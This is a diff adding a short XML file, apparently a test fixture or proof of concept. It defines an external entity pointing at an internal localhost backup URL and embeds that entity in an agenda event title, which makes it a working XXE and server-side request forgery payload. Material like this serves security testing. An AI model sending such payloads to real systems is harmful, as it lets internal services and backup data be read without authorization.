@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ZIP [ <!ENTITY xxe SYSTEM "http://localhost:4942/backup"> ]>
+<agenda><event><title>&xxe;</title></event></agenda>
